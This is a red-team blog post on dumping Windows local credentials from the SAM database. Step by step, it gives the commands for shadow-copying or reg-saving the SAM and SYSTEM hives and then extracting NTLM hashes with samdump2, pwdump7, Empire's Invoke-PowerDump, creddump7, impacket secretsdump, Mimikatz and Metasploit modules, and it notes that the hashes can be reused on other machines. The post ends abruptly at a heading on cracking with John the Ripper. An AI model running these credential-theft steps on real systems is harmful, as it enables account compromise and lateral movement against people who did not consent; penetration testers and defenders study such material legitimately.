---
title:  "Windows Credentials part-1 SAM Database"
classes: wide
header:
  teaser: /img/redteampng.png
ribbon: red
description: "Windows Credentials-SAM Database part-1"
categories:
  - Red-Teaming
toc: true
---

## Introduction to SAM 
Local Windows credentials are stored in the Security Account Manager (SAM) database as password hashes using the NTLM hashing format, which is based on the MD4 algorithm.

We can reuse acquired NTLM hashes to authenticate to a different machine, as long as the hash is tied to a user account and password registered on that machine

It is the responsibility of LSA (Local Security Authority) to verify user login by matching the passwords with the database maintained in SAM.

SAM starts running in the background as soon as the Windows boots up.

located at C:\Windows\System32\config\SAM
but the SYSTEM process has an exclusive lock on it, preventing us from reading or copying it even from an administrative command prompt

## Failure to copy the SAM database
```
copy c:\Windows\System32\config\sam C:\Users\nored0x\Downloads\sam
```
<img src="/img/cred1/1.PNG" alt="Getting-gz" width="1000" height="200"> 
 
There are two potential workarounds. 
 * First, we could use the Volume Shadow Copy Server, which can create a snapshot (or “shadow volume”) of the local hard drive with vssadmin,
 * The second approach, which will work on our Windows 10 machine, is to execute this option through WMIC launched from an administrative command prompt.
Specifically, we’ll launch wmic, specify the shadowcopy class, create a new shadow volume and specify the source drive with “Volume=‘C:\’”. This will create a snapshot of the C drive.
 
 
## Creating a shadow volume
```
 wmic shadowcopy call create Volume='C:\'
 ```
 <img src="/img/cred1/2.PNG" alt="Getting-gz" width="1000" height="100"> 


Listing shadow volumes
```
vssadmin list shadows
```

<img src="/img/cred1/3.PNG" alt="Getting-gz" width="1000" height="100"> 



## Shadow copying the SAM database
```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\sam C:\users\nored0x\Downloads\sam
```

<img src="/img/cred1/4.PNG" alt="Getting-gz" width="1000" height="200"> 

The encryption keys are stored in the SYSTEM file, which is in the same folder as the SAM database. However, it is also locked by the SYSTEM account

## Shadow copying the SYSTEM file

```
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\system32\config\system C:\users\nored0x\Downloads\system
```

<img src="/img/cred1/5.PNG" alt="Getting-gz" width="1000" height="200"> 

## register
We can also obtain a copy of the SAM database and SYSTEM files from the registry in the HKLM\sam and HKLM\system hives, respectively. Administrative permissions are required to read and copy
```
reg save HKLM\sam C:\users\nored0x\Downloads\sam
```
<img src="/img/cred1/6.PNG" alt="Getting-gz" width="1000" height="200"> 
```
reg save HKLM\system C:\users\nored0x\Desktop\system
```
<img src="/img/cred1/7.PNG" alt="Getting-gz" width="1000" height="200"> 

## tools
## samdump2
```
samdump2 SYSTEM SAM 
```

<img src="/img/cred1/t1.PNG" alt="Getting-gz" width="1000" height="200"> 

## pwdump7
 This tool extracts the SAM file from the system and dumps its credentials

download :https://www.tarasco.org/security/pwdump_7/pwdump7.zip
windws7
```
pwdump7.exe 
```
<img src="/img/cred1/pd7.PNG" alt="Getting-gz" width="1000" height="200"> 
windows10
```
pwdump7.exe
```

<img src="/img/cred1/pd77.PNG" alt="Getting-gz" width="1000" height="200"> 

## Invoke-PowerDump.ps1
```
download:https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-PowerDump.ps1
Import-Module .\Invoke-PowerDump.ps1
Invoke-PowerDump
```
<img src="/img/cred1/pd.PNG" alt="Getting-gz" width="1000" height="200"> 

## creddump7
```
sudo apt install python-crypto
sudo git clone https://github.com/Neohapsis/creddump7
python pwdump.py /home/kali/system /home/kali/sam
```

<img src="/img/cred1/cred7.PNG" alt="Getting-gz" width="1000" height="200"> 

    
## impacket
Impacket tool can also extract all the hashes for you from the SAM file
```
impacket-secretsdump -system SYSTEM -sam SAM local
```
<img src="/img/cred1/impacker.PNG" alt="Getting-gz" width="1000" height="200"> 

## Mimikatz
```
privilege::debug
token::elevate  ##allowing mimikatz to access the SAM file
lsadump::sam
```
<img src="/img/cred1/z1.PNG" alt="Getting-gz" width="1000" height="200"> 

<img src="/img/cred1/z2.PNG" alt="Getting-gz" width="1000" height="200"> 

## Metasploit Framework: HashDump
The hashdump post module will dump the contents of the SAM database.

```
hashdump
```
<img src="/img/cred1/hashdump.PNG" alt="Getting-gz" width="1000" height="200"> 


## Metasploit Framework: credential_collector
```
use post/windows/gather/credentials/credential_collector
set session n
exploit
```

<img src="/img/cred1/collect.PNG" alt="Getting-gz" width="1000" height="200"> 

## Metasploit Framework: load kiwi
Kiwi extension to perform various types of credential-oriented operations, such as dumping passwords and hashes, dumping passwords in memory, generating golden tickets, and much more
```
load kiwi
lsa_dump_sam
```

<img src="/img/cred1/kiwi.PNG" alt="Getting-gz" width="1000" height="200"> 

## Decrypting Hash
John The Ripper
